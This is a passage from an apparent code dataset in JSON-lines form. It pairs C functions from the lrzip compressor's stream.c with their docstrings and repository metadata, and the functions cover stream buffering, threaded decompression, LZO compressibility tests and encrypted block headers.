malloc(LZO1X_1_MEM_COMPRESS);\n\tif (unlikely(wrkmem == NULL))\n\t\tfatal_return((\"Unable to allocate wrkmem in lzo_compresses\\n\"), 0);\n\n\tin_len = MIN(test_len, buftest_size);\n\tdlen = STREAM_BUFSIZE + STREAM_BUFSIZE / 16 + 64 + 3;\n\n\tc_buf = malloc(dlen);\n\tif (unlikely(!c_buf)) {\n\t\tdealloc(wrkmem);\n\t\tfatal_return((\"Unable to allocate c_buf in lzo_compresses\\n\"), 0);\n\t}\n\n\t/* Test progressively larger blocks at a time and as soon as anything\n\t   compressible is found, jump out as a success */\n\twhile (test_len > 0) {\n\t\tworkcounter++;\n\t\tlzo1x_1_compress(test_buf, in_len, (uchar *)c_buf, &dlen, wrkmem);\n\n\t\tif (dlen < best_dlen)\n\t\t\tbest_dlen = dlen;\t/* save best value */\n\n\t\tif (dlen < in_len) {\n\t\t\tret = 1;\n\t\t\tbreak;\n\t\t}\n\t\t/* expand and move buffer */\n\t\ttest_len -= in_len;\n\t\tif (test_len) {\n\t\t\ttest_buf += (ptrdiff_t)in_len;\n\t\t\tif (buftest_size < STREAM_BUFSIZE)\n\t\t\t\tbuftest_size <<= 1;\n\t\t\tin_len = MIN(test_len, buftest_size);\n\t\t}\n\t}\n\tprint_maxverbose(\"lzo testing %s for chunk %ld. Compressed size = %5.2F%% of chunk, %d Passes\\n\",\n\t\t\t(ret == 0? \"FAILED\" : \"OK\"), save_len,\n\t\t\t100 * ((double) best_dlen / (double) in_len), workcounter);\n\n\tdealloc(wrkmem);\n\tdealloc(c_buf);\n\n\treturn ret;\n}", "path": "lrzip/stream.c", "commit_date": "2019-12-03 00:00:00", "repo_name": "ckolivas/lrzip", "stars": 567, "license": "gpl-2.0", "language": "c", "size": 2396}
{"docstring": "/* Dump STDIN into a temporary file */\n", "func_signal": "static int dump_stdin(rzip_control *control)", "code": "{\n\tif (unlikely(!write_fdin(control)))\n\t\treturn -1;\n\tif (unlikely(!read_tmpinfile(control, control->fd_in)))\n\t\treturn -1;\n\tclose_tmpinbuf(control);\n\treturn 0;\n}", "path": "lrzip/stream.c", "commit_date": "2019-12-03 00:00:00", "repo_name": "ckolivas/lrzip", "stars": 567, "license": "gpl-2.0", "language": "c", "size": 2396}
{"docstring": "/* fill a buffer from a stream - return -1 on failure */\n", "func_signal": "static int fill_buffer(rzip_control *control, struct stream_info *sinfo, struct stream *s, int streamno)", "code": "{\n\ti64 u_len, c_len, last_head, padded_len, header_length, max_len;\n\tuchar enc_head[25 + SALT_LEN], blocksalt[SALT_LEN];\n\tstream_thread_struct *st;\n\tuchar c_type, *s_buf;\n\tvoid *thr_return;\n\n\tdealloc(s->buf);\n\tif (s->eos)\n\t\tgoto out;\nfill_another:\n\tif (unlikely(ucthread[s->uthread_no].busy))\n\t\tfailure_return((\"Trying to start a busy thread, this shouldn't happen!\\n\"), -1);\n\n\tif (unlikely(read_seekto(control, sinfo, s->last_head)))\n\t\treturn -1;\n\n\tif (ENCRYPT) {\n\t\tif (unlikely(read_buf(control, sinfo->fd, enc_head, SALT_LEN)))\n\t\t\treturn -1;\n\t\tsinfo->total_read += SALT_LEN;\n\t}\n\n\tif (unlikely(read_u8(control, sinfo->fd, &c_type)))\n\t\treturn -1;\n\n\t/* Compatibility crap for versions < 0.4 */\n\tif (control->major_version == 0 && control->minor_version < 4) {\n\t\tu32 c_len32, u_len32, last_head32;\n\n\t\tif (unlikely(read_u32(control, sinfo->fd, &c_len32)))\n\t\t\treturn -1;\n\t\tif (unlikely(read_u32(control, sinfo->fd, &u_len32)))\n\t\t\treturn -1;\n\t\tif (unlikely(read_u32(control, sinfo->fd, &last_head32)))\n\t\t\treturn -1;\n\t\tc_len = c_len32;\n\t\tu_len = u_len32;\n\t\tlast_head = last_head32;\n\t\theader_length = 13;\n\t} else {\n\t\tint read_len;\n\n\t\tprint_maxverbose(\"Reading ucomp header at %lld\\n\", get_readseek(control, sinfo->fd));\n\t\tif ((control->major_version == 0 && control->minor_version < 6) || ENCRYPT)\n\t\t\tread_len = 8;\n\t\telse\n\t\t\tread_len = sinfo->chunk_bytes;\n\t\tif (unlikely(read_val(control, sinfo->fd, &c_len, read_len)))\n\t\t\treturn -1;\n\t\tif (unlikely(read_val(control, sinfo->fd, &u_len, read_len)))\n\t\t\treturn -1;\n\t\tif (unlikely(read_val(control, sinfo->fd, &last_head, read_len)))\n\t\t\treturn -1;\n\t\theader_length = 1 + (read_len * 3);\n\t}\n\tsinfo->total_read += header_length;\n\n\tif (ENCRYPT) {\n\t\tif (unlikely(!decrypt_header(control, enc_head, &c_type, &c_len, &u_len, &last_head)))\n\t\t\treturn -1;\n\t\tif (unlikely(read_buf(control, sinfo->fd, blocksalt, SALT_LEN)))\n\t\t\treturn -1;\n\t\tsinfo->total_read += SALT_LEN;\n\t}\n\tc_len = le64toh(c_len);\n\tu_len = le64toh(u_len);\n\tlast_head = le64toh(last_head);\n\tprint_maxverbose(\"Fill_buffer stream %d c_len %lld u_len %lld last_head %lld\\n\", streamno, c_len, u_len, last_head);\n\n\t/* It is possible for there to be an empty match block at the end of\n\t * incompressible data */\n\tif (unlikely(c_len == 0 && u_len == 0 && streamno == 1 && last_head == 0)) {\n\t\tprint_maxverbose(\"Skipping empty match block\\n\");\n\t\tgoto skip_empty;\n\t}\n\n\t/* Check for invalid data and that the last_head is actually moving\n\t * forward correctly. */\n\tif (unlikely(c_len < 1 || u_len < 1 || last_head < 0 || (last_head && last_head <= s->last_head))) {\n\t\tfatal_return((\"Invalid data compressed len %lld uncompressed %lld last_head %lld\\n\",\n\t\t\t     c_len, u_len, last_head), -1);\n\t}\n\n\tpadded_len = MAX(c_len, MIN_SIZE);\n\tsinfo->total_read += padded_len;\n\tfsync(control->fd_out);\n\n\tif (unlikely(u_len > control->maxram))\n\t\tprint_progress(\"Warning, attempting to malloc very large buffer for this environment of size %lld\\n\", u_len);\n\tmax_len = MAX(u_len, MIN_SIZE);\n\tmax_len = MAX(max_len, c_len);\n\ts_buf = malloc(max_len);\n\tif (unlikely(!s_buf))\n\t\tfatal_return((\"Unable to malloc buffer of size %lld in fill_buffer\\n\", u_len), -1);\n\tsinfo->ram_alloced += u_len;\n\n\tif (unlikely(read_buf(control, sinfo->fd, s_buf, padded_len))) {\n\t\tdealloc(s_buf);\n\t\treturn -1;\n\t}\n\n\tif (unlikely(ENCRYPT && !lrz_decrypt(control, s_buf, padded_len, blocksalt))) {\n\t\tdealloc(s_buf);\n\t\treturn -1;\n\t}\n\n\tucthread[s->uthread_no].s_buf = s_buf;\n\tucthread[s->uthread_no].c_len = c_len;\n\tucthread[s->uthread_no].u_len = u_len;\n\tucthread[s->uthread_no].c_type = c_type;\n\tucthread[s->uthread_no].streamno = streamno;\n\ts->last_head = last_head;\n\n\t/* List this thread as busy */\n\tucthread[s->uthread_no].busy = 1;\n\tprint_maxverbose(\"Starting thread %ld to decompress %lld bytes from stream %d\\n\",\n\t\t\t s->uthread_no, padded_len, streamno);\n\n\tst = malloc(sizeof(stream_thread_struct));\n\tif (unlikely(!st))\n\t\tfatal_return((\"Unable to malloc in fill_buffer\"), -1);\n\tst->i = s->uthread_no;\n\tst->control = control;\n\tif (unlikely(!create_pthread(control, &threads[s->uthread_no], NULL, ucompthread, st))) {\n\t\tdealloc(st);\n\t\treturn -1;\n\t}\n\n\tif (++s->uthread_no == s->base_thread + s->total_threads)\n\t\ts->uthread_no = s->base_thread;\nskip_empty:\n\t/* Reached the end of this stream, no more data to read in, otherwise\n\t * see if the next thread is free to grab more data. We also check that\n\t * we're not going to be allocating too much ram to generate all these\n\t * threads. */\n\tif (!last_head)\n\t\ts->eos = 1;\n\telse if (s->uthread_no != s->unext_thread && !ucthread[s->uthread_no].busy &&\n\t\t sinfo->ram_alloced < control->maxram)\n\t\t\tgoto fill_another;\nout:\n\tlock_mutex(control, &output_lock);\n\toutput_thread = s->unext_thread;\n\tcond_broadcast(control, &output_cond);\n\tunlock_mutex(control, &output_lock);\n\n\t/* join_pthread here will make it wait till the data is ready */\n\tthr_return = NULL;\n\tif (unlikely(!join_pthread(control, threads[s->unext_thread], &thr_return) || !!thr_return))\n\t\treturn -1;\n\tucthread[s->unext_thread].busy = 0;\n\n\tprint_maxverbose(\"Taking decompressed data from thread %ld\\n\", s->unext_thread);\n\ts->buf = ucthread[s->unext_thread].s_buf;\n\tucthread[s->unext_thread].s_buf = NULL;\n\ts->buflen = ucthread[s->unext_thread].u_len;\n\tsinfo->ram_alloced -= s->buflen;\n\ts->bufp = 0;\n\n\tif (++s->unext_thread == s->base_thread + s->total_threads)\n\t\ts->unext_thread = s->base_thread;\n\n\treturn 0;\n}", "path": "lrzip/stream.c", "commit_date": "2019-12-03 00:00:00", "repo_name": "ckolivas/lrzip", "stars": 567, "license": "gpl-2.0", "language": "c", "size": 2396}
{"docstring": "/* write to a file, return 0 on success and -1 on failure */\n", "func_signal": "static int write_buf(rzip_control *control, uchar *p, i64 len)", "code": "{\n\tssize_t ret;\n\n\tret = write_1g(control, p, (size_t)len);\n\tif (unlikely(ret == -1)) {\n\t\tprint_err(\"Write of length %lld failed - %s\\n\", len, strerror(errno));\n\t\treturn -1;\n\t}\n\tif (unlikely(ret != (ssize_t)len)) {\n\t\tprint_err(\"Partial write!? asked for %lld bytes but got %lld\\n\", len, (i64)ret);\n\t\treturn -1;\n\t}\n\treturn 0;\n}", "path": "lrzip/stream.c", "commit_date": "2019-12-03 00:00:00", "repo_name": "ckolivas/lrzip", "stars": 567, "license": "gpl-2.0", "language": "c", "size": 2396}
{"docstring": "/* open a set of output streams, compressing with the given\n   compression level and algorithm */\n", "func_signal": "void *open_stream_out(rzip_control *control, int f, unsigned int n, i64 chunk_limit, char cbytes)", "code": "{\n\tstruct stream_info *sinfo;\n\ti64 testsize, limit;\n\tuchar *testmalloc;\n\tunsigned int i, testbufs;\n\n\tsinfo = calloc(sizeof(struct stream_info), 1);\n\tif (unlikely(!sinfo))\n\t\treturn NULL;\n\tif (chunk_limit < control->page_size)\n\t\tchunk_limit = control->page_size;\n\tsinfo->bufsize = sinfo->size = limit = chunk_limit;\n\n\tsinfo->chunk_bytes = cbytes;\n\tsinfo->num_streams = n;\n\tsinfo->fd = f;\n\n\tsinfo->s = calloc(sizeof(struct stream), n);\n\tif (unlikely(!sinfo->s)) {\n\t\tdealloc(sinfo);\n\t\treturn NULL;\n\t}\n\n\t/* Find the largest we can make the window based on ability to malloc\n\t * ram. We need 2 buffers for each compression thread and the overhead\n\t * of each compression back end. No 2nd buf is required when there is\n\t * no back end compression. We limit the total regardless to 1/3 ram\n\t * for when the OS lies due to heavy overcommit. */\n\tif (NO_COMPRESS)\n\t\ttestbufs = 1;\n\telse\n\t\ttestbufs = 2;\n\n\ttestsize = (limit * testbufs) + (control->overhead * control->threads);\n\tif (testsize > control->usable_ram)\n\t\tlimit = (control->usable_ram - (control->overhead * control->threads)) / testbufs;\n\n\t/* If we don't have enough ram for the number of threads, decrease the\n\t * number of threads till we do, or only have one thread. */\n\twhile (limit < STREAM_BUFSIZE && limit < chunk_limit) {\n\t\tif (control->threads > 1)\n\t\t\t--control->threads;\n\t\telse\n\t\t\tbreak;\n\t\tlimit = (control->usable_ram - (control->overhead * control->threads)) / testbufs;\n\t\tlimit = MIN(limit, chunk_limit);\n\t}\n\tif (BITS32) {\n\t\tlimit = MIN(limit, one_g);\n\t\tif (limit + (control->overhead * control->threads) > one_g)\n\t\t\tlimit = one_g - (control->overhead * control->threads);\n\t}\n\t/* Use a nominal minimum size should we fail all previous shrinking */\n\tlimit = MAX(limit, STREAM_BUFSIZE);\n\tlimit = MIN(limit, chunk_limit);\nretest_malloc:\n\ttestsize = limit + (control->overhead * control->threads);\n\ttestmalloc = malloc(testsize);\n\tif (!testmalloc) {\n\t\tlimit = limit / 10 * 9;\n\t\tgoto retest_malloc;\n\t}\n\tif (!NO_COMPRESS) {\n\t\tchar *testmalloc2 = malloc(limit);\n\n\t\tif (!testmalloc2) {\n\t\t\tdealloc(testmalloc);\n\t\t\tlimit = limit / 10 * 9;\n\t\t\tgoto retest_malloc;\n\t\t}\n\t\tdealloc(testmalloc2);\n\t}\n\tdealloc(testmalloc);\n\tprint_maxverbose(\"Succeeded in testing %lld sized malloc for back end compression\\n\", testsize);\n\n\t/* Make the bufsize no smaller than STREAM_BUFSIZE. Round up the\n\t * bufsize to fit X threads into it */\n\tsinfo->bufsize = MIN(limit, MAX((limit + control->threads - 1) / control->threads,\n\t\t\t\t\tSTREAM_BUFSIZE));\n\n\tif (control->threads > 1)\n\t\tprint_maxverbose(\"Using up to %d threads to compress up to %lld bytes each.\\n\",\n\t\t\tcontrol->threads, sinfo->bufsize);\n\telse\n\t\tprint_maxverbose(\"Using only 1 thread to compress up to %lld bytes\\n\",\n\t\t\tsinfo->bufsize);\n\n\tfor (i = 0; i < n; i++) {\n\t\tsinfo->s[i].buf = calloc(sinfo->bufsize , 1);\n\t\tif (unlikely(!sinfo->s[i].buf)) {\n\t\t\tfatal(\"Unable to malloc buffer of size %lld in open_stream_out\\n\", sinfo->bufsize);\n\t\t\tdealloc(sinfo->s);\n\t\t\tdealloc(sinfo);\n\t\t\treturn NULL;\n\t\t}\n\t}\n\n\treturn (void *)sinfo;\n}", "path": "lrzip/stream.c", "commit_date": "2019-12-03 00:00:00", "repo_name": "ckolivas/lrzip", "stars": 567, "license": "gpl-2.0", "language": "c", "size": 2396}
{"docstring": "/* The block headers are all encrypted so we read the data and salt associated\n * with them, decrypt the data, then return the decrypted version of the\n * values */\n", "func_signal": "static bool decrypt_header(rzip_control *control, uchar *head, uchar *c_type,\n\t\t\t   i64 *c_len, i64 *u_len, i64 *last_head)", "code": "{\n\tuchar *buf = head + SALT_LEN;\n\n\tmemcpy(buf, c_type, 1);\n\tmemcpy(buf + 1, c_len, 8);\n\tmemcpy(buf + 9, u_len, 8);\n\tmemcpy(buf + 17, last_head, 8);\n\n\tif (unlikely(!lrz_decrypt(control, buf, 25, head)))\n\t\treturn false;\n\n\tmemcpy(c_type, buf, 1);\n\tmemcpy(c_len, buf + 1, 8);\n\tmemcpy(u_len, buf + 9, 8);\n\tmemcpy(last_head, buf + 17, 8);\n\treturn true;\n}", "path": "lrzip/stream.c", "commit_date": "2019-12-03 00:00:00", "repo_name": "ckolivas/lrzip", "stars": 567, "license": "gpl-2.0", "language": "c", "size": 2396}
{"docstring": "/* Ditto for read */\n", "func_signal": "ssize_t read_1g(rzip_control *control, int fd, void *buf, i64 len)", "code": "{\n\tuchar *offset_buf = buf;\n\tssize_t ret;\n\ti64 total;\n\n\tif (TMP_INBUF && fd == control->fd_in) {\n\t\t/* We're decompressing from STDIN */\n\t\tif (unlikely(control->in_ofs + len > control->in_maxlen)) {\n\t\t\t/* We're unable to fit it all into the temp buffer */\n\t\t\tif (dump_stdin(control))\n\t\t\t\tfailure_return((\"Inadequate ram to %compress from STDIN and unable to create in tmpfile\"), -1);\n\t\t\tgoto read_fd;\n\t\t}\n\t\tif (control->in_ofs + len > control->in_len) {\n\t\t\tif (unlikely(!read_fdin(control, control->in_ofs + len - control->in_len)))\n\t\t\t\treturn false;\n\t\t}\n\t\tmemcpy(buf, control->tmp_inbuf + control->in_ofs, len);\n\t\tcontrol->in_ofs += len;\n\t\treturn len;\n\t}\n\n\tif (TMP_OUTBUF && fd == control->fd_out) {\n\t\tif (unlikely(control->out_ofs + len > control->out_maxlen))\n\t\t\tfailure_return((\"Trying to read beyond out_ofs in tmpoutbuf\\n\"), -1);\n\t\tmemcpy(buf, control->tmp_outbuf + control->out_ofs, len);\n\t\tcontrol->out_ofs += len;\n\t\treturn len;\n\t}\n\nread_fd:\n\ttotal = 0;\n\twhile (len > 0) {\n\t\tret = MIN(len, one_g);\n\t\tret = read(fd, offset_buf, (size_t)ret);\n\t\tif (unlikely(ret <= 0))\n\t\t\treturn ret;\n\t\tlen -= ret;\n\t\toffset_buf += ret;\n\t\ttotal += ret;\n\t}\n\treturn total;\n}", "path": "lrzip/stream.c", "commit_date": "2019-12-03 00:00:00", "repo_name": "ckolivas/lrzip", "stars": 567, "license": "gpl-2.0", "language": "c", "size": 2396}
{"docstring": "/* Once the final data has all been written to the block header, we go back\n * and write SALT_LEN bytes of salt before it, and encrypt the header in place\n * by reading what has been written, encrypting it, and writing back over it.\n * This is very convoluted depending on whether a last_head value is written\n * to this block or not. See the callers of this function */\n", "func_signal": "static bool rewrite_encrypted(rzip_control *control, struct stream_info *sinfo, i64 ofs)", "code": "{\n\tuchar *buf, *head;\n\ti64 cur_ofs;\n\n\tcur_ofs = get_seek(control, sinfo->fd) - sinfo->initial_pos;\n\tif (unlikely(cur_ofs == -1))\n\t\treturn false;\n\thead = malloc(25 + SALT_LEN);\n\tif (unlikely(!head))\n\t\tfatal_return((\"Failed to malloc head in rewrite_encrypted\\n\"), false);\n\tbuf = head + SALT_LEN;\n\tif (unlikely(!get_rand(control, head, SALT_LEN)))\n\t\tgoto error;\n\tif (unlikely(seekto(control, sinfo, ofs - SALT_LEN)))\n\t\tfailure_goto((\"Failed to seekto buf ofs in rewrite_encrypted\\n\"), error);\n\tif (unlikely(write_buf(control, head, SALT_LEN)))\n\t\tfailure_goto((\"Failed to write_buf head in rewrite_encrypted\\n\"), error);\n\tif (unlikely(read_buf(control, sinfo->fd, buf, 25)))\n\t\tfailure_goto((\"Failed to read_buf buf in rewrite_encrypted\\n\"), error);\n\n\tif (unlikely(!lrz_encrypt(control, buf, 25, head)))\n\t\tgoto error;\n\n\tif (unlikely(seekto(control, sinfo, ofs)))\n\t\tfailure_goto((\"Failed to seek back to ofs in rewrite_encrypted\\n\"), error);\n\tif (unlikely(write_buf(control, buf, 25)))\n\t\tfailure_goto((\"Failed to write_buf encrypted buf in rewrite_encrypted\\n\"), error);\n\tdealloc(head);\n\tseekto(control, sinfo, cur_ofs);\n\treturn true;\nerror:\n\tdealloc(head);\n\treturn false;\n}", "path": "lrzip/stream.c", "commit_date": "2019-12-03 00:00:00", "repo_name": "ckolivas/lrzip", "stars": 567, "license": "gpl-2.0", "language": "c", "size": 2396}
{"docstring": "/* write some data to a stream. Return -1 on failure */\n", "func_signal": "void write_stream(rzip_control *control, void *ss, int streamno, uchar *p, i64 len)", "code": "{\n\tstruct stream_info *sinfo = ss;\n\n\twhile (len) {\n\t\ti64 n;\n\n\t\tn = MIN(sinfo->bufsize - sinfo->s[streamno].buflen, len);\n\n\t\tmemcpy(sinfo->s[streamno].buf + sinfo->s[streamno].buflen, p, n);\n\t\tsinfo->s[streamno].buflen += n;\n\t\tp += n;\n\t\tlen -= n;\n\n\t\t/* Flush the buffer every sinfo->bufsize into one thread */\n\t\tif (sinfo->s[streamno].buflen == sinfo->bufsize)\n\t\t\tflush_buffer(control, sinfo, streamno);\n\t}\n}", "path": "lrzip/stream.c", "commit_date": "2019-12-03 00:00:00", "repo_name": "ckolivas/lrzip", "stars": 567, "license": "gpl-2.0", "language": "c", "size": 2396}
{"docstring": "/*\n  ***** DECOMPRESSION FUNCTIONS *****\n\n  ZPAQ, BZIP, GZIP, LZMA, LZO\n\n  try to decompress a buffer. Return 0 on success and -1 on failure.\n*/\n", "func_signal": "static int zpaq_decompress_buf(rzip_control *control __UNUSED__, struct uncomp_thread *ucthread, long thread)", "code": "{\n\ti64 dlen = ucthread->u_len;\n\tuchar *c_buf;\n\tint ret = 0;\n\n\tc_buf = ucthread->s_buf;\n\tucthread->s_buf = malloc(round_up_page(control, dlen));\n\tif (unlikely(!ucthread->s_buf)) {\n\t\tprint_err(\"Failed to allocate %ld bytes for decompression\\n\", dlen);\n\t\tret = -1;\n\t\tgoto out;\n\t}\n\n\tdlen = 0;\n\tzpaq_decompress(ucthread->s_buf, &dlen, c_buf, ucthread->c_len,\n\t\t\tcontrol->msgout, SHOW_PROGRESS ? true: false, thread);\n\n\tif (unlikely(dlen != ucthread->u_len)) {\n\t\tprint_err(\"Inconsistent length after decompression. Got %ld bytes, expected %lld\\n\", dlen, ucthread->u_len);\n\t\tret = -1;\n\t} else\n\t\tdealloc(c_buf);\nout:\n\tif (ret == -1) {\n\t\tdealloc(ucthread->s_buf);\n\t\tucthread->s_buf = c_buf;\n\t}\n\treturn ret;\n}", "path": "lrzip/stream.c", "commit_date": "2019-12-03 00:00:00", "repo_name": "ckolivas/lrzip", "stars": 567, "license": "gpl-2.0", "language": "c", "size": 2396}
{"docstring": "/* Look at whether we're writing to a ram location or physical files and write\n * the data accordingly. */\n", "func_signal": "ssize_t put_fdout(rzip_control *control, void *offset_buf, ssize_t ret)", "code": "{\n\tif (!TMP_OUTBUF)\n\t\treturn write(control->fd_out, offset_buf, (size_t)ret);\n\n\tif (unlikely(control->out_ofs + ret > control->out_maxlen)) {\n\t\t/* The data won't fit in a temporary output buffer so we have\n\t\t * to fall back to temporary files. */\n\t\tprint_verbose(\"Unable to decompress entirely in ram, will use physical files\\n\");\n\t\tif (unlikely(control->fd_out == -1))\n\t\t\tfailure(\"Was unable to decompress entirely in ram and no temporary file creation was possible\\n\");\n\t\tif (unlikely(!write_fdout(control, control->tmp_outbuf, control->out_len))) {\n\t\t\tprint_err(\"Unable to write_fdout tmpoutbuf in put_fdout\\n\");\n\t\t\treturn -1;\n\t\t}\n\t\tclose_tmpoutbuf(control);\n\t\tif (unlikely(!write_fdout(control, offset_buf, ret))) {\n\t\t\tprint_err(\"Unable to write_fdout offset_buf in put_fdout\\n\");\n\t\t\treturn -1;\n\t\t}\n\t\treturn ret;\n\t}\n\tmemcpy(control->tmp_outbuf + control->out_ofs, offset_buf, ret);\n\tcontrol->out_ofs += ret;\n\tif (likely(control->out_ofs > control->out_len))\n\t\tcontrol->out_len = control->out_ofs;\n\treturn ret;\n}", "path": "lrzip/stream.c", "commit_date": "2019-12-03 00:00:00", "repo_name": "ckolivas/lrzip", "stars": 567, "license": "gpl-2.0", "language": "c", "size": 2396}
{"docstring": "/* read some data from a stream. Return number of bytes read, or -1\n   on failure */\n", "func_signal": "i64 read_stream(rzip_control *control, void *ss, int streamno, uchar *p, i64 len)", "code": "{\n\tstruct stream_info *sinfo = ss;\n\tstruct stream *s = &sinfo->s[streamno];\n\ti64 ret = 0;\n\n\twhile (len) {\n\t\ti64 n;\n\n\t\tn = MIN(s->buflen - s->bufp, len);\n\n\t\tif (n > 0) {\n\t\t\tif (unlikely(!s->buf))\n\t\t\t\tfailure_return((\"Stream ran out prematurely, likely corrupt archive\\n\"), -1);\n\t\t\tmemcpy(p, s->buf + s->bufp, n);\n\t\t\ts->bufp += n;\n\t\t\tp += n;\n\t\t\tlen -= n;\n\t\t\tret += n;\n\t\t}\n\n\t\tif (len && s->bufp == s->buflen) {\n\t\t\tif (unlikely(fill_buffer(control, sinfo, s, streamno)))\n\t\t\t\treturn -1;\n\t\t\tif (s->bufp == s->buflen)\n\t\t\t\tbreak;\n\t\t}\n\t}\n\n\treturn ret;\n}", "path": "lrzip/stream.c", "commit_date": "2019-12-03 00:00:00", "repo_name": "ckolivas/lrzip", "stars": 567, "license": "gpl-2.0", "language": "c", "size": 2396}
{"docstring": "/* flush and close down a stream. return -1 on failure */\n", "func_signal": "int close_stream_out(rzip_control *control, void *ss)", "code": "{\n\tstruct stream_info *sinfo = ss;\n\tint i;\n\n\tfor (i = 0; i < sinfo->num_streams; i++)\n\t\tclear_buffer(control, sinfo, i, 0);\n\n\tif (ENCRYPT) {\n\t\t/* Last two compressed blocks do not have an offset written\n\t\t * to them so we have to go back and encrypt them now, but we\n\t\t * must wait till the threads return. */\n\t\tint close_thread = output_thread;\n\n\t\tfor (i = 0; i < control->threads; i++) {\n\t\t\tcksem_wait(control, &cthread[close_thread].cksem);\n\t\t\tcksem_post(control, &cthread[close_thread].cksem);\n\t\t\tif (++close_thread == control->threads)\n\t\t\t\tclose_thread = 0;\n\t\t}\n\t\tfor (i = 0; i < sinfo->num_streams; i++)\n\t\t\trewrite_encrypted(control, sinfo, sinfo->s[i].last_headofs);\n\t}\n\tif (control->library_mode) {\n\t\tif (!control->sinfo_buckets) {\n\t\t\t/* no streams added */\n\t\t\tcontrol->sinfo_queue = calloc(STREAM_BUCKET_SIZE + 1, sizeof(void*));\n\t\t\tif (!control->sinfo_queue) {\n\t\t\t\tprint_err(\"Failed to calloc sinfo_queue in close_stream_out\\n\");\n\t\t\t\treturn -1;\n\t\t\t}\n\t\t\tcontrol->sinfo_buckets++;\n\t\t} else if (control->sinfo_idx == STREAM_BUCKET_SIZE * control->sinfo_buckets + 1) {\n\t\t\t/* all buckets full, create new bucket */\n\t\t\tvoid *tmp;\n\n\t\t\ttmp = realloc(control->sinfo_queue, (++control->sinfo_buckets * STREAM_BUCKET_SIZE + 1) * sizeof(void*));\n\t\t\tif (!tmp) {\n\t\t\t\tprint_err(\"Failed to realloc sinfo_queue in close_stream_out\\n\");\n\t\t\t\treturn -1;\n\t\t\t}\n\t\t\tcontrol->sinfo_queue = tmp;\n\t\t\tmemset(control->sinfo_queue + control->sinfo_idx, 0, ((control->sinfo_buckets * STREAM_BUCKET_SIZE + 1) - control->sinfo_idx) * sizeof(void*));\n\t\t}\n\t\tcontrol->sinfo_queue[control->sinfo_idx++] = sinfo;\n\t}\n#if 0\n\t/* These cannot be freed immediately because their values are read after the next\n\t * stream has started. Instead (in library mode), they are stored and only freed\n\t * after the entire operation has completed.\n\t */\n\tdealloc(sinfo->s);\n\tdealloc(sinfo);\n#endif\n\treturn 0;\n}", "path": "lrzip/stream.c", "commit_date": "2019-12-03 00:00:00", "repo_name": "ckolivas/lrzip", "stars": 567, "license": "gpl-2.0", "language": "c", "size": 2396}
{"docstring": "/* close down an input stream */\n", "func_signal": "int close_stream_in(rzip_control *control, void *ss)", "code": "{\n\tstruct stream_info *sinfo = ss;\n\tint i;\n\n\tprint_maxverbose(\"Closing stream at %lld, want to seek to %lld\\n\",\n\t\t\t get_readseek(control, control->fd_in),\n\t\t\t sinfo->initial_pos + sinfo->total_read);\n\tif (unlikely(read_seekto(control, sinfo, sinfo->total_read)))\n\t\treturn -1;\n\n\tfor (i = 0; i < sinfo->num_streams; i++)\n\t\tdealloc(sinfo->s[i].buf);\n\n\toutput_thread = 0;\n\tdealloc(ucthread);\n\tdealloc(threads);\n\tdealloc(sinfo->s);\n\tdealloc(sinfo);\n\n\treturn 0;\n}", "path": "lrzip/stream.c", "commit_date": "2019-12-03 00:00:00", "repo_name": "ckolivas/lrzip", "stars": 567, "license": "gpl-2.0", "language": "c", "size": 2396}
{"docstring": "/* This is a custom version of write() which writes in 1GB chunks to avoid\n   the overflows at the >= 2GB mark thanks to 32bit fuckage. This should help\n   even on the rare occasion write() fails to write 1GB as well. */\n", "func_signal": "ssize_t write_1g(rzip_control *control, void *buf, i64 len)", "code": "{\n\tuchar *offset_buf = buf;\n\tssize_t ret;\n\ti64 total;\n\n\ttotal = 0;\n\twhile (len > 0) {\n\t\tret = MIN(len, one_g);\n\t\tret = put_fdout(control, offset_buf, (size_t)ret);\n\t\tif (unlikely(ret <= 0))\n\t\t\treturn ret;\n\t\tlen -= ret;\n\t\toffset_buf += ret;\n\t\ttotal += ret;\n\t}\n\treturn total;\n}", "path": "lrzip/stream.c", "commit_date": "2019-12-03 00:00:00", "repo_name": "ckolivas/lrzip", "stars": 567, "license": "gpl-2.0", "language": "c", "size": 2396}
{"docstring": "/* Should be called only if we know the buffer will be large enough, otherwise\n * we must dump_stdin first */\n", "func_signal": "static bool read_fdin(struct rzip_control *control, i64 len)", "code": "{\n\tint tmpchar;\n\ti64 i;\n\n\tfor (i = 0; i < len; i++) {\n\t\ttmpchar = getchar();\n\t\tif (unlikely(tmpchar == EOF))\n\t\t\tfailure_return((\"Reached end of file on STDIN prematurely on read_fdin, asked for %lld got %lld\\n\",\n\t\t\t\tlen, i), false);\n\t\tcontrol->tmp_inbuf[control->in_ofs + i] = (char)tmpchar;\n\t}\n\tcontrol->in_len = control->in_ofs + len;\n\treturn true;\n}", "path": "lrzip/stream.c", "commit_date": "2019-12-03 00:00:00", "repo_name": "ckolivas/lrzip", "stars": 567, "license": "gpl-2.0", "language": "c", "size": 2396}
{"docstring": "/* seek to a position within a set of streams - return -1 on failure */\n", "func_signal": "static int seekto(rzip_control *control, struct stream_info *sinfo, i64 pos)", "code": "{\n\ti64 spos = pos + sinfo->initial_pos;\n\n\tif (TMP_OUTBUF) {\n\t\tspos -= control->out_relofs;\n\t\tcontrol->out_ofs = spos;\n\t\tif (unlikely(spos > control->out_len || spos < 0)) {\n\t\t\tprint_err(\"Trying to seek to %lld outside tmp outbuf in seekto\\n\", spos);\n\t\t\treturn -1;\n\t\t}\n\t\treturn 0;\n\t}\n\n\treturn fd_seekto(control, sinfo, spos, pos);\n}", "path": "lrzip/stream.c", "commit_date": "2019-12-03 00:00:00", "repo_name": "ckolivas/lrzip", "stars": 567, "license": "gpl-2.0", "language": "c", "size": 2396}
